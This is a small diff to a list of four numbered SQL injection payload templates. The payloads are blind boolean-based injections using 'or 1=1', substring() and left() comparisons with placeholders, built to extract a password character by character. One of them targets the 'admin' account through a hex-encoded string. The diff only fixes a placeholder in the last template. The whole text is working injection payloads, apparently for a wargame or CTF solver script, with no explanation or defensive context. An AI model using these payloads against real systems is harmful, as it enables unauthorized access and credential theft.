@@ -1,4 +1,4 @@
 0.'or 1=1 and substring({pw},1,{i}) = '{j}'-- -
 1.'|| 1=1 && substring({pw},1,{i}) = '{j}'-- -
 2.'|| true && left({pw},{i}) like '{j}'-- -
-3.1 || 1 like 1 && id like 0x61646d696e && left(pw,{i}) like "{j}"-- -
+3.1 || 1 like 1 && id like 0x61646d696e && left({pw},{i}) like "{j}"-- -
